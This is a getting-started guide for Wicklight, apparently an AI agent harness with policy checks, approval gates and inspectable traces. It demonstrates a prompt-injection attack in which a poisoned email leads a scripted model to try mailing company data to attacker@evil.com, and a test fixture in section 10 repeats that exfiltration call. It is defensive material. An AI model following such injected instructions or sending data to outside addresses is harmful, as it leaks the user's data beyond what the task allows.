# Getting started

A guided tour of Wicklight, from an empty directory to a run you can inspect
step by step. It takes about fifteen minutes and needs **no API key** — every
command here runs offline against the fake provider.

The README has the short version. This is the long one: it explains *why* each
piece exists, so that by the end you can write your own agent file and read its
trace without guessing.

## 1. Install

Wicklight isn't on PyPI yet, so install from source. It uses
[uv](https://docs.astral.sh/uv/), which downloads a suitable Python 3.10+ for
you — that's the only prerequisite
([install uv](https://docs.astral.sh/uv/getting-started/installation/)).

```bash
git clone https://github.com/wicklight-agents/wicklight.git
cd wicklight
uv sync                       # creates .venv and installs from uv.lock
uv run wicklight --version    # 0.1.0
```

Every command below is prefixed with `uv run`, which uses that environment
without activating it. If you'd rather type a bare `wicklight`, either activate
the venv (`source .venv/bin/activate`) or install it as a tool
(`uv tool install --editable .`).

## 2. The one idea

An agent in Wicklight is **one Markdown file** with two halves:

```markdown
---
name: inbox-summarizer
models:
  default: anthropic/claude-sonnet
tools:
  read_inbox: read
---
You summarize this week's emails and draft replies.
```

- **Above the closing `---`** is YAML frontmatter. These are **rules the harness
  enforces.** The model cannot see them, argue with them, or talk its way past
  them. Tools are off unless listed here.
- **Below it** is the prompt — a *request* the model may or may not follow.

That split is the whole safety model. Anything you need to be true must live
above the line, because everything below it is a suggestion.

## 3. Validate before you run — `check`

`check` parses an agent file, validates it, and prints the **effective
configuration**: every setting, with where it came from.

```bash
uv run wicklight check examples/inbox.md
```

```
agent: inbox-summarizer

models:
  default: anthropic/claude-sonnet (from file)
  routes: 0 (default)
  fallback: none (default)

limits:
  max_steps: 20 (from file)
  max_cost: $1.00 (default)
  timeout: 300s (default)

tools:
  read_inbox: read (from file)
  send_email: write, approval required (from file)

irreversible tools:
  none
```

The `(from file)` / `(default)` tags are the point: you never have to wonder
whether a limit is one you set or one you inherited. `check` also reports which
API-key environment variables the file's models need (and whether they're set —
never their values), plus any capability or routing problems.

It exits non-zero on a validation error, so it works as a CI gate. Errors are
line-numbered and reported **all at once**, not one per run:

```
inbox.md line 7: unexpected key 'toolz'. Did you mean 'tools'?
```

Try breaking the file on purpose — misspell a key, set `level: destroy` — and
re-run `check`. Learning what its errors look like is worth two minutes now.

## 4. Your first run — offline, with a scripted model

A real run calls a real model. For learning (and for tests), Wicklight ships a
**fake provider**: you write the model's responses in a YAML script and it
replays them in order. Deterministic, free, and no network.

You also need a world for the tools to act on. `MockWorld` is an in-memory
inbox / filesystem / ledger seeded from a YAML file.

```bash
uv run wicklight run examples/inbox.md "summarize my inbox" \
  --fake examples/scripts/summarize.yaml \
  --world examples/worlds/inbox.yaml \
  --trace
```

`--trace` streams each event as it happens:

```
Step 0
  run_started        run started for agent inbox-summarizer
Step 1
  context_built      built context with 2 messages (0 untrusted)
  model_routed       routed to anthropic/claude-sonnet by default
  model_called       called anthropic/claude-sonnet
  model_responded    model responded (tool_use) using 21 in / 0 out tokens
  tool_proposed      model proposed read_inbox
  policy_checked     allowed: read_inbox by policy email_only_to
  tool_executed      executed read_inbox in 0ms
...
  run_finished       run finished: completed in 3 steps
```

Read that list top to bottom and you have the entire loop: build context, route,
call the model, see what it proposed, check it, run it. Nothing happens that
isn't an event — that's enforced in the core, not a convention.

The run writes a trace to `runs/<run_id>.jsonl`. The command prints the path.

## 5. The demo that explains the project

Now the interesting one. The same agent, a different world: the inbox contains a
**poisoned email** that instructs the agent to forward company data to an
outside address. The scripted model *falls for it*.

```bash
uv run wicklight run examples/inbox.md "handle my inbox" \
  --fake examples/scripts/injection.yaml \
  --world examples/worlds/injection.yaml \
  --trace
```

```
Step 2
  tool_proposed      model proposed send_email
  policy_checked     blocked: send_email by policy email_only_to — send_email to
                     attacker@evil.com is not allowed; recipients must match one
                     of: @mycompany.com (inbox.md line 22)
Step 3
  model_responded    model responded (stop) using 111 in / 24 out tokens
  run_finished       run finished: completed in 3 steps
```

The model was fully compromised and **no mail left the building**. Two
mechanisms did that, both in the core:

1. **Untrusted tagging.** Every tool result enters context flagged
   `trusted=False` and wrapped in a "data, not instructions" envelope. Only the
   agent file and your task are trusted. Notice `2 untrusted` in the
   `context_built` event.
2. **Policies.** `email_only_to` ran before the tool did, denied the call, and
   cited its own line number in the agent file. The denial went back to the
   model as a result, so the run continued rather than crashing.

The lesson Wicklight is built around: **don't try to make the model
trustworthy — make the harness enforce the rule.**

## 6. Read the run back

The trace is the source of truth, and three commands read it. None of them calls
a model or runs a tool, so they're always safe.

```bash
uv run wicklight trace show runs/<run_id>.jsonl           # the whole run
uv run wicklight trace show runs/<run_id>.jsonl --step 2  # one step
uv run wicklight explain runs/<run_id>.jsonl --step 2     # what the model saw
uv run wicklight replay runs/<run_id>.jsonl               # step interactively
```

`explain` is the one to reach for when an agent did something surprising: it
reconstructs the exact context at a step, which messages were untrusted, what
the model proposed, and every check that ran against it.

`replay` moves a cursor over the events with keys:

```
[n]ext · [p]rev · <step#> · [b]lock · [a]pproval · [e]rror · [q]uit
```

`b`, `a`, and `e` jump straight to the next block, approval, or error — usually
the only steps you care about. `--all` prints everything non-interactively, for
CI and bug reports.

### Or open it in a browser

```bash
uv run wicklight view                           # list every run under ./runs
uv run wicklight view examples/sample.jsonl     # a specific trace
```

The viewer is local-only: it binds to `127.0.0.1`, needs no account, never runs
an agent, and only reads files already on disk. It shows the timeline with
badges for blocked / approved / waived / retried steps; expanding one gives you
the browser version of `explain`. See [the viewer](./viewer.md).

## 7. The human gate

Some actions shouldn't happen without a person. A tool needs approval if it's
marked `approval: required`, **or** if it's `irreversible` and not explicitly
waived — the safe default.

```bash
uv run wicklight run examples/payments.md "pay the invoice" \
  --fake examples/scripts/pay_invoice.yaml \
  --world examples/worlds/invoice.yaml --trace
```

At a terminal this stops and asks `Approve? [y/N]`, showing the tool, its
arguments, and why approval is needed. The default is **no**.

The gate **fails closed** everywhere it can: no approver configured means
denied; a non-interactive run (piped output, CI) means denied with an
explanation rather than hanging on a prompt that can't appear.

If you genuinely want an irreversible tool to run unattended, you must waive it
*in writing*:

```yaml
tools:
  purge: { level: irreversible, waive_approval: true, reason: "nightly scratch cleanup" }
```

`check` rejects a waiver with no reason and lists every waiver prominently, and
the trace records the waiver as an `approval_resolved` event with
`waived: true`. A waiver is always auditable.

## 8. "What would this do?" — dry run

Before pointing an agent at anything real:

```bash
uv run wicklight run examples/payments.md "pay the invoice" \
  --fake examples/scripts/pay_invoice.yaml \
  --world examples/worlds/invoice.yaml --dry-run --trace
```

Every tool is stubbed. Calls still go through permission, policy, and approval
checks — **blocked calls are still blocked and still shown** — but a call that
passes is recorded as `would have run <tool> (dry run)` instead of executing.
Nothing leaves your machine except model calls.

It answers two questions at once: what would this agent do, and what would my
policies stop?

## 9. Write your own

Copy an example and change it. The frontmatter keys, in full:

```yaml
---
name: my-agent                      # required

models:
  default: fake/demo                # required: provider/model
  routes:                           # optional: per-step model choice
    - when: { step: planning }
      use: anthropic/claude-opus
  fallback: [openai/gpt-4o]         # optional: tried on provider failure

tools:                              # tools are OFF unless listed
  read_inbox: read                  # shorthand for { level: read }
  send_email: { level: write, approval: required }
  read_file:  { level: read, sensitive: true }
  purge:      { level: irreversible, waive_approval: true, reason: "..." }

policies:                           # checked before every tool call
  - email_only_to: ["@mycompany.com"]
  - paths_within: ["./docs"]
  - spend_limit: { max_usd: 100, per_call_usd: 50 }

limits:
  max_steps: 20                     # default 20
  max_cost: 1.00                    # default $1.00
  timeout: 300                      # default 300s
  max_retries: 2                    # default 2
  retry_backoff: 1.0                # default 1.0s
---
Your prompt goes here.
```

Unknown keys are **errors**, not ignored settings — a typo in a safety rule
should never fail silently. Permission levels are ordered
`off < read < write < irreversible`, and a tool whose declared risk exceeds the
level you granted is blocked before it runs.

Validate as you go:

```bash
uv run wicklight check my-agent.md
```

## 10. From Python

The CLI is a thin wrapper over a library:

```python
from wicklight import Agent
from wicklight.providers import FakeProvider
from wicklight.tools import MockWorld

agent = Agent.load("examples/inbox.md")
result = agent.run("summarize my inbox", world=MockWorld(), provider=FakeProvider(...))

print(result.status, result.steps, result.output, result.trace_path)
```

`agent.run()` is a synchronous wrapper over `agent.arun()` and works inside a
notebook too. Note that the library default is **fail-closed on approvals**:
pass `approver=TerminalApprover()` to prompt, or `AutoApprove()` in tests.

For tests, `wicklight.testing.Scenario` bundles an agent, a script, and a world
into one assertion-friendly object. Its three fields take the **file contents**,
not paths, so a scenario is self-contained and readable in one screen:

```python
from wicklight.testing import Scenario

AGENT = """\
---
name: inbox-summarizer
models: { default: fake/demo }
tools:
  read_inbox: read
  send_email: { level: write }
policies:
  - email_only_to: ["@mycompany.com"]
---
Handle my inbox.
"""

SCRIPT = """\
responses:
  - tool_calls: [{ name: read_inbox }]
  - tool_calls:
      - name: send_email
        arguments: { to: attacker@evil.com, subject: hi, body: data }
  - text: "That was blocked, so I stopped."
"""

(
    Scenario(agent=AGENT, script=SCRIPT, task="handle my inbox")
    .run()
    .assert_completed()
    .assert_not_ran("send_email")
    .assert_blocked(tool="send_email", by="email_only_to")
)
```

`ScenarioResult` also offers `assert_stopped`, `assert_ran`, `assert_approved`,
`assert_approval_denied`, and `assert_limit`, and exposes the raw `events` and
the resulting `world` for custom assertions.

## 11. Going real

When you're ready to use an actual model:

- **Keys come from the environment**, never the agent file — `ANTHROPIC_API_KEY`,
  `OPENAI_API_KEY`. `check` tells you which are needed and whether they're set.
  The trace writer redacts key-shaped strings before anything touches disk, so a
  key can't land in a trace even via an error message. See
  [credentials](./credentials.md).
- **Or stay fully local.** The `local/` provider speaks the OpenAI-compatible
  wire format that Ollama and vLLM expose — no key, nothing leaving your
  machine. See [local models](./local-models.md).
- `uv run wicklight providers list` shows what's installed and each one's
  declared capabilities.

## Where to go next

| You want to… | Read |
| --- | --- |
| understand the loop and where each check runs | [The loop](./the-loop.md) |
| read a trace field by field | [Trace events](./trace-events.md) |
| see every feature at once | [Capabilities](./capabilities.md) |
| write or configure a policy | [Policies](./policies.md) |
| tune the human gate | [Approvals & waivers](./approvals.md) |
| send different steps to different models | [Model routing](./routing.md) |
| re-inspect or re-check a past run | [Replay, explain & dry-run](./replay.md) |
| use the browser UI | [The local web viewer](./viewer.md) |
| ship an agent as a container | [The deploy file](./deploy-file.md) |
| contribute or file an issue | [the GitHub repo](https://github.com/wicklight-agents/wicklight) |
